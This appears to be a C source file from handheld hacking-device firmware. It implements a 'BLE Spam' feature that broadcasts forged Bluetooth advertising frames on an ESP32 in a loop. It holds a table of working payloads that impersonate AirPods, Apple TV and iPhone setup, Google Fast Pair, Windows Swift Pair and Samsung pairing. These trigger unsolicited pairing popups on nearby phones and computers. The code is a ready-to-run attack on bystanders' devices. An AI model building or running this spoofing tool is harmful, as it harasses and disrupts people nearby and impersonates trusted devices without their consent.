/* See COPYING.txt for license details. */

/*
 * m1_ble_spam.c
 *
 * BLE Beacon Spam — cycles advertising payloads that trigger
 * pairing / proximity notifications on nearby devices.
 *
 * Each payload is a raw BLE advertising data frame (AD structures)
 * encoded as a hex string for AT+BLEADVDATA.
 *
 * Payload byte layouts:
 *   02 01 1A  — Flags: LE General Discoverable, BR/EDR Not Supported
 *   XX FF ... — Manufacturer Specific Data (length, type=0xFF, company, data)
 *   XX 03 ... — Complete 16-bit UUID list
 *   XX 16 ... — Service Data
 *
 * All payloads fit within the BLE 31-byte advertising data limit.
 */

/*************************** I N C L U D E S **********************************/
#include "app_freertos.h"
#include "cmsis_os.h"
#include "main.h"
#include "m1_lcd.h"
#include "m1_display.h"
#include "m1_menu.h"
#include "m1_tasks.h"
#include "m1_system.h"
#include "m1_compile_cfg.h"
#include "m1_ble_spam.h"
#include "m1_esp32_hal.h"
#include "esp_app_main.h"
#include "m1_log_debug.h"
#include <string.h>
#include <stdio.h>

#ifdef M1_APP_BLE_SPAM_ENABLE

/*************************** D E F I N E S ************************************/

#define M1_LOGDB_TAG  "BSPAM"

/* Time between payload switches (ms) */
#define BLE_SPAM_CYCLE_MS   1500

/************************** S T A T I C S *************************************/

/*
 * Advertising payload table.
 *
 * Format: raw BLE advertising data as uppercase hex (no spaces).
 * Each AD structure: <len> <type> <data...>
 *
 * --- Apple iOS payloads (Continuity Protocol, Company ID 0x004C) ---
 * Type 0x07 = Proximity Pairing
 *   Byte 0 (after type/len): Status  0x10=new, 0x00=paired
 *   Bytes 1-2: Device model (little-endian)
 *   Byte 3:    Status
 *   Bytes 4-24: Encrypted/random data (zeros for popup trigger)
 *
 * Device model IDs (partial list):
 *   0x2002 = AirPods (1st gen)
 *   0x200F = AirPods (2nd gen)
 *   0x2013 = AirPods (3rd gen)
 *   0x200E = AirPods Pro (1st gen)
 *   0x2014 = AirPods Pro (2nd gen)
 *   0x200A = AirPods Max
 *   0x1007 = Beats X
 *   0x0220 = Apple TV (triggers TV setup popup, type=0x04)
 *
 * Type 0x04 = Nearby Action
 *   Byte 0: Action type (0x05=iPhone setup, 0x06=Apple TV, etc.)
 *
 * --- Google Fast Pair (Android) ---
 * Service UUID: 0xFE2C
 * Service Data AD: 03 16 2C FE [model_id 3 bytes] 00 00 ...
 * Common model IDs that trigger Android popup:
 *   0xF52494 = generic "Headphones"
 *   0x1E89A7 = generic "Earbuds"
 *
 * --- Windows Swift Pair ---
 * Company ID: 0x0006 (Microsoft)
 * Subtype: 0x03 = Swift Pair
 *
 * --- Samsung Galaxy Fast Pair ---
 * Company ID: 0x0075 (Samsung)
 */
static const ble_spam_payload_t s_payloads[] =
{
    /* -------- Apple iOS: AirPods 1st gen (model 0x2002, LE=[02,20]) -------- */
    {
        "Apple AirPods",
        /* No Flags prefix — this payload fills all 31 bytes exactly.
         * 1E FF 4C 00  = Mfr specific: length=30, type=0xFF, Apple (0x004C)
         * 07 19        = type=Proximity Pairing, inner_len=25
         * 10 02 20     = status=new(0x10), model=[0x02,0x20]=0x2002 AirPods gen1
         * 00×22        = encrypted zeros (22 bytes)
         */
        "1EFF4C000719100220"
        "00000000000000000000000000000000000000000000"
    },

    /* -------- Apple iOS: AirPods Pro 1st gen (model 0x200E, LE=[0E,20]) -------- */
    {
        "Apple AirPods Pro",
        /* model=[0x0E,0x20]=0x200E */
        "1EFF4C000719100E20"
        "00000000000000000000000000000000000000000000"
    },

    /* -------- Apple iOS: AirPods Max (model 0x200A, LE=[0A,20]) -------- */
    {
        "Apple AirPods Max",
        /* model=[0x0A,0x20]=0x200A */
        "1EFF4C000719100A20"
        "00000000000000000000000000000000000000000000"
    },

    /* -------- Apple iOS: Apple TV Nearby Action (type=0x04, action=0x06) -------- */
    {
        "Apple TV Setup",
        /* 02 01 1A  = Flags
         * 0B FF 4C 00 = Apple Mfr (len=11)
         * 04 06     = type=Nearby Action, action=0x06 (AppleTV)
         * 00 × 8    = padding
         */
        "02011A0BFF4C00040600000000000000"
    },

    /* -------- Apple iOS: iPhone setup (Nearby Action 0x05) -------- */
    {
        "Apple iPhone Setup",
        "02011A0BFF4C000405000000000000"
    },

    /* -------- Google Fast Pair / Android (model 0xF52494 = generic headphones) -------- */
    {
        "Android Fast Pair",
        /* 02 01 1A         Flags
         * 03 03 2C FE      Complete 16-bit UUID: 0xFE2C (Fast Pair, LE)
         * 05 16 2C FE      Service Data UUID 0xFE2C (len=5: type+uuid+model)
         *    F5 24 94       Fast Pair model ID (3 bytes)
         */
        "02011A03032CFE05162CFEF52494"
    },

    /* -------- Windows Swift Pair (Microsoft, Company ID 0x0006) -------- */
    {
        "Windows Swift Pair",
        /* 02 01 06         Flags
         * 0A FF 06 00      Microsoft company (len=10)
         *    03             Subtype = Swift Pair
         *    00 × 7         Reserved padding
         */
        "0201060AFF060003000000000000"
    },

    /* -------- Samsung Galaxy Fast Pair (Company ID 0x0075) -------- */
    {
        "Samsung Galaxy",
        /* 02 01 06
         * 0A FF 75 00      Samsung company (len=10)
         *    42 09 81 00 01 00 00  Samsung Fast Pair TLV data
         */
        "0201060AFF750042098100010000"
    },
};

#define BLE_SPAM_COUNT   ((int)(sizeof(s_payloads) / sizeof(s_payloads[0])))

/********************* H E L P E R S *****************************************/

static void spam_draw_screen(int idx, bool running)
{
    m1_u8g2_firstpage();
    u8g2_SetDrawColor(&m1_u8g2, M1_DISP_DRAW_COLOR_TXT);

    /* Title bar */
    u8g2_SetFont(&m1_u8g2, M1_DISP_RUN_MENU_FONT_B);
    u8g2_DrawXBMP(&m1_u8g2, 0, 0, 128, 14, m1_frame_128_14);
    u8g2_DrawStr(&m1_u8g2, 2, 10, "BLE Spam");

    /* Current payload name */
    u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
    char idx_buf[8];
    snprintf(idx_buf, sizeof(idx_buf), "%d/%d", idx + 1, BLE_SPAM_COUNT);
    u8g2_DrawStr(&m1_u8g2, 2, 26, s_payloads[idx].name);
    u8g2_DrawStr(&m1_u8g2, 100, 26, idx_buf);

    /* Status */
    u8g2_DrawStr(&m1_u8g2, 2, 40, running ? "Spamming..." : "Stopped");

    /* Bottom bar: LEFT=prev, BACK=stop, RIGHT=next */
    m1_draw_bottom_bar(&m1_u8g2, arrowleft_8x8, "Stop", "Next", arrowright_8x8);

    m1_u8g2_nextpage();
}

static bool spam_check_buttons(int *idx_out, bool *stop_out)
{
    S_M1_Main_Q_t  q_item;
    S_M1_Buttons_Status btn;

    if (xQueueReceive(main_q_hdl, &q_item, 0) != pdTRUE)
        return false;
    if (q_item.q_evt_type != Q_EVENT_KEYPAD)
        return false;
    if (xQueueReceive(button_events_q_hdl, &btn, 0) != pdTRUE)
        return false;

    if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK ||
        btn.event[BUTTON_LEFT_KP_ID] == BUTTON_EVENT_CLICK)
    {
        *stop_out = true;
        return true;
    }
    if (btn.event[BUTTON_RIGHT_KP_ID] == BUTTON_EVENT_CLICK ||
        btn.event[BUTTON_OK_KP_ID]    == BUTTON_EVENT_CLICK)
    {
        *idx_out = (*idx_out + 1) % BLE_SPAM_COUNT;
        return true;
    }
    return false;
}

/* Helper: send an AT command and ignore the response */
static void spam_at(const char *cmd)
{
    char resp[64];
    spi_AT_send_recv(cmd, resp, sizeof(resp), 3);
}

/*************** E N T R Y   P O I N T ***************************************/

/*============================================================================*/
/**
 * @brief  BLE Beacon Spam — menu entry point
 *
 * Initialises ESP32 BLE in server mode, then loops:
 *   - Sends AT+BLEADVPARAM (legacy, non-connectable params)
 *   - Sends AT+BLEADVDATA  (current payload)
 *   - Sends AT+BLEADVSTART
 *   - Waits BLE_SPAM_CYCLE_MS, checking for button presses
 *   - Sends AT+BLEADVSTOP
 *   - Advances to next payload
 *
 * RIGHT or OK advances payload immediately.
 * LEFT or BACK stops spamming and returns.
 */
/*============================================================================*/
void ble_spam_run(void)
{
    int  payload_idx = 0;
    bool stop = false;

    /* Ensure ESP32 is up */
    if (!m1_esp32_get_init_status())
        m1_esp32_init();
    if (!get_esp32_main_init_status())
        esp32_main_init();
    if (!get_esp32_main_init_status())
    {
        m1_message_box(&m1_u8g2, "BLE Spam", "ESP32 not", "ready", " OK ");
        m1_esp32_deinit();
        return;
    }

    /* Init BLE in server role */
    spam_at("AT+BLEINIT=2\r\n");
    osDelay(200);

    /* Set non-connectable, non-scannable advertising parameters so the
     * spam packets go out as pure beacons (ADV_NONCONN_IND type=3):
     * min=32(20ms), max=64(40ms), type=3(ADV_NONCONN_IND),
     * addr=0, ch=7, filter=0 */
    spam_at("AT+BLEADVPARAM=32,64,3,0,7,0\r\n");

    spam_draw_screen(payload_idx, true);

    while (!stop)
    {
        /* ---- transmit the current payload ---- */
        {
            char adv_cmd[80];
            snprintf(adv_cmd, sizeof(adv_cmd),
                     "AT+BLEADVDATA=\"%s\"\r\n",
                     s_payloads[payload_idx].adv_data);
            spam_at(adv_cmd);
        }
        spam_at("AT+BLEADVSTART\r\n");

        /* ---- wait BLE_SPAM_CYCLE_MS, checking buttons in 100ms chunks ---- */
        uint32_t remaining = BLE_SPAM_CYCLE_MS;
        while (remaining > 0 && !stop)
        {
            uint32_t chunk = (remaining > 100) ? 100 : remaining;
            osDelay(chunk);
            remaining -= chunk;
            spam_check_buttons(&payload_idx, &stop);
        }

        /* ---- stop advertising before switching payload ---- */
        spam_at("AT+BLEADVSTOP\r\n");

        if (!stop)
        {
            payload_idx = (payload_idx + 1) % BLE_SPAM_COUNT;
            spam_draw_screen(payload_idx, true);
        }
    }

    /* Clean up — shut BLE down */
    spam_at("AT+BLEADVSTOP\r\n");
    spam_at("AT+BLEINIT=0\r\n");

    spam_draw_screen(payload_idx, false);
    osDelay(500);
    m1_esp32_deinit();
}

#endif /* M1_APP_BLE_SPAM_ENABLE */
